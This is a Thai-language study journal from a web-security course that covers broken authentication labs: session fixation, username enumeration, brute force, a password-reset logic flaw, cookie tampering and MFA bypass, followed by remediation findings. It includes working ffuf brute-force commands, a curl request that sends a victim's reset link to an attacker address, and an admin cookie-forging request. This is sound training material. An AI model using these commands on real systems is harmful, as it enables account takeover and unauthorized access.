# Day 10 — Broken Authentication (ขยาย)

---

## สิ่งที่เรียนวันนี้

Day 10 เรียนเรื่อง Broken Authentication ช่องโหว่ที่เกิดขึ้นกับส่วนของการทำงานในการยืนยันตัวตนสำหรับเข้าสู่ระบบ โดยเป็นการเพิ่มเติมจาก Day 3 ให้ลึกยิ่งขึ้น

3 หัวข้อหลักที่เรียนวันนี้คือ

1. **Session Fixation** คือการกำหนด session ID ไว้ล่วงหน้า และหลอกล่อให้เหยื่อใช้งาน session ID ดังกล่าว เพื่อที่ Attacker จะสามารถใช้งานในระบบได้เหมือนเหยื่อเพราะ session ID เดียวกัน

2. **Weak Lockout** คือระบบที่ออกแบบให้ไม่มี account lockout ส่งผลทำให้ attacker สามารถทำการ brute force ระบบได้ไม่จำกัด

3. **MFA Bypass** คือการข้ามขั้นตอน MFA โดยใช้เทคนิค 3 เทคนิค:
   - **OTP Leakage** การเปิดเผยข้อมูล 2FA ผ่าน response มากเกินไป
   - **Logic Flaw or Insecure Coding** การข้ามขั้นตอน 2FA เนื่องจากระบบออกแบบให้เช็คแค่ข้อมูล Account ถูกต้องเท่านั้น
   - **Beating the Auto-Logout Feature** การออกแบบระบบที่ไม่ครอบคลุมการทำ rate limit

---

## ความรู้พื้นฐานที่ได้เพิ่มเติม

### MFA (Multi-Factor Authentication) คืออะไร

MFA คือการยืนยันตัวตนมากกว่า 1 ปัจจัย โดยแบ่งเป็น 5 ประเภท:

- **Something you know** — password, PIN
- **Something you have** — โทรศัพท์, security key (YubiKey)
- **Something you are** — ลายนิ้วมือ, Face ID
- **Somewhere you are** — IP address, geolocation
- **Something you do** — behavioral analysis

ต้องข้ามหมวดกันถึงจะเรียกว่า MFA จริงๆ — password + PIN ไม่ใช่ MFA เพราะเป็น "สิ่งที่รู้" ทั้งคู่

### Session, Cookie, Session Cookie — ต่างกันยังไง

- **Cookie** คือกล่องเก็บของที่ browser เก็บไว้ ส่งไป server ทุก request
- **Session ID** คือรหัสประจำตัวที่ server สร้างให้หลัง login เพื่อจำว่า "คนนี้คือใคร"
- **Session Cookie** คือ cookie ที่เก็บ Session ID ไว้ข้างใน เช่น `PHPSESSID=m3ph4ri14c2tjg56heavmfsnga`

สรุป: Cookie = กล่อง, Session ID = บัตรประจำตัว, Session Cookie = กล่องที่ใส่บัตรประจำตัว

### Session Fixation vs Session Hijacking

- **Session Fixation** = attacker กำหนด session ID ให้เหยื่อ **ก่อน** login
- **Session Hijacking** = attacker ขโมย session ID ของเหยื่อ **หลัง** login เช่น ใช้ XSS ดึง `document.cookie`

### Cookie Flags ที่สำคัญ

- **HttpOnly** — JavaScript อ่าน cookie ไม่ได้ กัน XSS cookie stealing
- **Secure** — ส่ง cookie เฉพาะ HTTPS เท่านั้น กันการดักข้อมูลระหว่างทาง
- **SameSite** — กำหนดว่า cookie ส่งข้าม site ได้ไหม กัน CSRF

### CIA Triad

- **Confidentiality** — ข้อมูลไม่หลุด
- **Integrity** — ข้อมูลไม่ถูกแก้ไข
- **Availability** — ระบบใช้งานได้

---

## สรุป Challenge ที่ทำ

### Room 1: Authentication Bypass

**Challenge 1: Username Enumeration**

เป็น Challenge ที่ต้องทำการสุ่มข้อมูล username ที่มีภายในระบบผ่านการอ่าน error response ที่ระบบแจ้งเตือนที่ให้ข้อมูลมากเกินไป "username already exists" ส่งผลให้ attacker สามารถทราบได้ว่าภายในระบบมี username อะไรบ้าง

ใช้ ffuf ในการ brute force:

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
```

- `FUZZ` = keyword placeholder ที่ ffuf จะแทนที่ด้วยค่าจาก wordlist ทีละตัว
- `-mr` = match regex แสดงเฉพาะ response ที่มีข้อความที่ระบุ
- `-w` = ชี้ไปที่ไฟล์ wordlist

**Challenge 2: Brute Force**

เป็น Challenge ที่ต้องทำการสุ่มข้อมูล Password สำหรับเข้าสู่ระบบผ่าน wordlists โดยการใช้งาน ffuf ในการสุ่มข้อมูล

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
```

- `-fc 200` = filter code ซ่อน response ที่ได้ status code 200 (login ผิด) เหลือแค่ 302 (login สำเร็จ)
- `W1`, `W2` = ตัวแปรที่ใช้แทน FUZZ เมื่อใช้หลาย wordlist

**Challenge 3: Logic Flaw**

เป็น Challenge ที่ต้องใช้งานช่องโหว่การเลือก method ที่ไม่เหมาะสมในการพัฒนาระบบอย่าง `$_REQUEST` ที่สามารถรองรับค่าได้ทั้ง GET และ POST โดย POST จะชนะ GET เมื่อ key ซ้ำกัน

Attacker ใช้ช่องโหว่นี้ในการ path POST request ข้อมูล email ที่ใช้ในการ reset password ของเหยื่อให้เป็นอีเมลของ attacker แทน:

```bash
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

- GET: `email=robert@acmeitsupport.thm` (ใช้หา account)
- POST: `email=attacker@hacker.com` (POST ชนะ GET → reset link ส่งไป attacker)

**Challenge 4: Cookie Tampering**

เป็น Challenge ที่อธิบายถึงการใช้งาน Plain Text, Hashing, Encoding:

- **Plain Text** คือข้อมูลแบบอักษรธรรมดา
- **Hashing** คือข้อมูลการเข้ารหัสทางเดียว ไม่สามารถถอดรหัสย้อนกลับได้
- **Encoding** คือข้อมูลการเข้ารหัสแบบ 2 ทาง ที่สามารถถอดรหัสย้อนกลับได้

Server เชื่อค่า cookie จาก client โดยไม่ตรวจสอบฝั่ง server:

```bash
curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
# ผลลัพธ์: Logged In As An Admin
```

### Room 2: Multi-Factor Authentication

Challenge ทั้งหมดมุ่งเน้นอธิบายถึง Types of Authentication Factors ในมุมมองของ OTP โดยรวมของ Challenge ทั้งหมดจะมีระบบป้องกันที่ดีขึ้นตามลำดับ จาก Challenge 1 → Challenge 2 → Challenge 3

**Challenge 1: OTP Leakage**

เป็น Challenge ที่อธิบายถึงระบบแสดงข้อมูลที่มากเกินไป คือการแสดงข้อมูล response ของ OTP ที่ถูกต้องเป็น plain text มาพร้อมกับ form กรอก OTP ส่งผลให้ attacker สามารถนำข้อมูลนั้นไปใช้งานแทน OTP จริงได้

วิธี exploit: เปิด Developer Tools → Network tab → ดู response ของ `/token` endpoint → พบ OTP ใน response

**Challenge 2: Insecure Coding**

เป็น Challenge ที่อธิบายถึงการข้ามขั้นตอนการใส่ OTP เนื่องจากระบบออกแบบมาให้เช็คข้อมูล account (username/password) เท่านั้น

```php
if (authenticate($email, $password)) {
    $_SESSION['authenticated'] = true;  // ← set true ก่อนผ่าน MFA
    header('Location: ' . ROOT_DIR . '/mfa');
}
```

วิธี exploit: Login สำเร็จ → ไม่ใส่ OTP → เปลี่ยน URL ตรงไป `/dashboard` → เข้าได้เลย เพราะ `$_SESSION['authenticated']` เป็น true แล้วตั้งแต่ login

**Challenge 3: Brute Force OTP (Beating the Auto-Logout Feature)**

เป็น Challenge ที่อธิบายถึงการสุ่ม OTP จำนวน 4 หลัก โดยใช้งาน Python script ระบบมีการป้องกันที่ดีขึ้น: ไม่ leak OTP, ต้องผ่าน OTP จริงถึงจะ authenticated, OTP ผิด → logout ทันที แต่ไม่มี rate limiting

วิธี exploit: ใช้ Python script วน loop: login → ลอง OTP → ผิดก็ login ใหม่ → ลองอีก → จนถูก → ได้ PHPSESSID ที่ผ่าน OTP แล้ว → แทนค่าใน browser → เข้า dashboard

---

## จุดที่เข้าใจผิดและต้องแก้ไข

### 1. Lockout อ่านเป็น Logout — สับสนภาษา

**เข้าใจผิด:** อ่าน lockout เป็น logout คิดว่า "ไม่มี account lockout" หมายถึง "ไม่มีการ logout"

**ที่ถูกต้อง:**
- **Lockout** = ล็อคบัญชี (ห้ามลอง login อีก)
- **Logout** = ออกจากระบบ (session จบ)

### 2. Brute Force กับ MFA Bypass — คิดว่าเป็นเรื่องเดียวกัน

**เข้าใจผิด:** คิดว่า brute force password (a) กับ bypass MFA (b) เป็นเรื่องเดียวกัน เพราะมองในมุมของ attacker ที่โจมตีหากจะเข้าสู่ระบบให้ได้คือการ login ให้ผ่านให้ได้

**ที่ถูกต้อง:**
- **Brute force password** = ลอง password ทีละตัวจนเจอตัวที่ถูก → ขั้นตอนแรกของ authentication
- **MFA bypass** = ข้าม OTP/2FA → ขั้นตอนที่สองของ authentication
- คนละขั้นตอนกัน ไม่มี lockout กระทบ brute force password โดยตรง

### 3. Enumeration — เข้าใจผิดว่าแปลว่า "เรียงลำดับ"

**เข้าใจผิด:** คิดว่า enumeration คือการเรียงลำดับ A-Z ไปเรื่อยๆ เพราะตีความจาก FUZZ ที่ใช้ brute force username

**ที่ถูกต้อง:** Enumeration หมายถึงการค้นหาและรวบรวมข้อมูลที่มีอยู่จริงในระบบ ในกรณีนี้คือการหา username ที่มีอยู่จริงโดยอาศัย error message ที่ระบบบอกว่า "username already exists"

### 4. Session และ Cookie — สับสนว่าต่างกันยังไง

**เข้าใจผิด:** เมื่อเจอคำว่า session cookie, session ID, cookie จะนึกถึง CSRF เสมอ และไม่สามารถแยกแยะได้ชัดเจน

**ที่ถูกต้อง:** Cookie = กล่องเก็บของ, Session ID = บัตรประจำตัว, Session Cookie = กล่องที่ใส่บัตรประจำตัว CSRF อาศัยว่า browser ส่ง cookie อัตโนมัติ แต่ไม่ใช่ทุกเรื่องที่เกี่ยวกับ cookie จะเป็น CSRF

---

## Finding ที่ควรแจ้งลูกค้า

### Finding 1: Brute Force username/password เมนู Login
- **Severity:** High
- **Root cause:** ระบบไม่มีการตั้งค่าสำหรับป้องกันการ Brute Force Attack
- **Impact:** Attacker สามารถ Brute Force username/password เมนู Login ผ่านการใช้ Python script ในการสุ่มข้อมูล
- **Remediation:** ตั้งค่า Rate limiting และ Progressive delay พร้อมใช้งาน Layer เสริมป้องกัน bot อย่าง CAPTCHA และ Block IP

### Finding 2: Username Enumeration (Information Disclosure)
- **Severity:** Medium
- **Root cause:** ระบบมีการแจ้งเตือนข้อมูลที่มากเกินไป (error message) ส่งผลให้เกิดช่องโหว่
- **Impact:** Attacker ทำการใส่ข้อมูล username/password เมนู Login ผิด แต่พบว่าระบบแจ้งเตือนข้อมูลมากเกินไป "username already exists" / "User not found" / "Password incorrect" ส่งผลให้ Attacker สามารถทราบข้อมูลของระบบได้
- **Remediation:** ตั้งค่า error message ให้เหมาะสม ไม่ควรแสดง error message จาก database โดยตรง ตัวอย่าง: "Incorrect Username or Password"

### Finding 3: OTP Leakage
- **Severity:** Critical
- **Root cause:** ระบบแสดงข้อมูล Response ข้อมูลที่มากเกินไป โดยส่ง OTP จริงกลับมาใน response
- **Impact:** Attacker สามารถทราบ OTP ได้จาก Developer Tools โดยไม่ต้องทำการสุ่ม ข้าม MFA ได้ทันที
- **Remediation:** ปรับการแสดงผลข้อมูล OTP เป็น "success" หรือ "failure" แทนการแสดงข้อมูลจริง

### Finding 4: Logic Flaw — Password Reset
- **Severity:** Critical
- **Root cause:** ระบบมีการใช้งาน method ที่ไม่เหมาะสม `$_REQUEST` ที่รวม GET + POST เข้าด้วยกัน
- **Impact:** Attacker สามารถ Bypass ข้ามขั้นตอนได้ โดยการ path POST request ทับแทนข้อมูลจริงที่ใช้ GET request ส่งผลให้ reset password link ถูกส่งไปยัง Attacker แทน
- **Remediation:** กำหนด method ที่เหมาะสม โดยการดึงข้อมูลอีเมลที่ถูกต้องผ่าน Database ที่มีข้อมูลตรงกับ account นั้นๆ เพื่อลดการรับข้อมูล input จากผู้ใช้งาน

### Finding 5: Insecure Coding — MFA Bypass
- **Severity:** Critical
- **Root cause:** ระบบกำหนด `$_SESSION['authenticated'] = true` ตั้งแต่ตอน login สำเร็จ ก่อนผ่าน MFA
- **Impact:** Attacker สามารถ Login เข้าสู่ระบบได้โดยที่ไม่ต้องกรอกข้อมูล OTP สามารถเข้าหน้าหลักได้เลย เพราะหน้ากรอก OTP เป็นแค่ client-side เท่านั้น server ถือว่าเงื่อนไขผ่านครบถ้วนแล้ว
- **Remediation:** แยก session เป็น 2 ขั้น: ขั้นที่ 1 password ถูก → set `$_SESSION['password_verified'] = true` (เข้าได้แค่หน้า MFA) ขั้นที่ 2 OTP ถูก → set `$_SESSION['authenticated'] = true` (เข้า dashboard ได้)

---

## Lesson สำคัญที่สุดของวันนี้

- **Session Fixation เป็นเรื่องที่ต่อยอดจาก CSRF** — จะเห็นได้ว่านอกจากการ Session Hijacking ที่เป็นการขโมย Session ยังมีวิธีที่กำหนดให้ใช้งาน Session เฉพาะ เพื่อที่จะอาศัยช่องโหว่ดังกล่าวในการปลอมตัว Root fix คือ regenerate session ID หลัง login สำเร็จทุกครั้ง

- **Weak Lockout** — การที่ไม่มี account lockout ทำให้การ brute force สามารถทำได้ไม่จำกัดจำนวนครั้ง ระบบที่ดีต้องผสม Rate limiting + Progressive delay + CAPTCHA + Block IP

- **MFA Bypass สามารถข้ามขั้นตอนที่คิดว่าทำได้ยาก** — ทั้ง OTP Leakage, Insecure Coding, Brute Force ล้วนเป็นวิธีที่ข้าม MFA ได้ และ Challenge แสดงให้เห็นว่าแม้ระบบจะป้องกันดีขึ้นตามลำดับ แต่ขาด rate limit เพียงอย่างเดียวก็ยังถูก brute force ได้

- **CIA Triad** — ในเคสจริงที่เคยพบ เลือกใช้งาน MFA อย่าง Google reCAPTCHA หาก Google มีปัญหา site ที่ใช้งานจะไม่สามารถ login เข้าใช้งานได้เลย เพราะระบบจะส่ง request พร้อม reCAPTCHA เท่านั้นถึงจะ login ได้ ทำให้ CIA Triad ในส่วนของ Availability หายไป ระบบที่ดีควรมี fallback

- **client-side validation ≠ security** — Room 2 Challenge 2 Insecure Coding อธิบายได้ดี แม้ระบบจะป้องกันการแสดงข้อมูล Response OTP แล้ว และมี UI หน้ากรอก OTP จริง แต่ server กลับไม่มีเงื่อนไขเช็คจริงๆ จึงไม่ได้มีระบบป้องกันอย่าง MFA จริงๆ เป็น concept เดียวกับ Day 1 ที่ JavaScript validation เป็นแค่ UX

---

*Day 10 Complete — ต่อไป: Day 11*
